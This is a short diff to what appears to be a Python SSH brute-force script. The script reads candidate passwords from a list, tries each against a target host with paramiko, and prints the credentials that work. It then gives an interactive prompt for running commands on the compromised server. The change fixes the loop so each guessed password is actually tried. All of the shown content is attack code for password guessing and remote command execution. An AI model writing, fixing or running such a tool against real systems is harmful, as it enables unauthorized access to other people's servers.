@@ -10,8 +10,8 @@ with open(password, 'r') as passlist:
         try:
             ssh_session = paramiko.SSHClient()
             ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-            ssh_session.connect(ip, port, username, password)
-            print(f'Login success!\nUsername: {username} , Password: {password}')
+            ssh_session.connect(ip, port, username, p)
+            print(f'Login success!\nUsername: {username} , Password: {p}')
             while True:
                 command = input('Insert a command to execute on the server:\t')
                 stdin, stdout, stderr = ssh_session.exec_command(command)
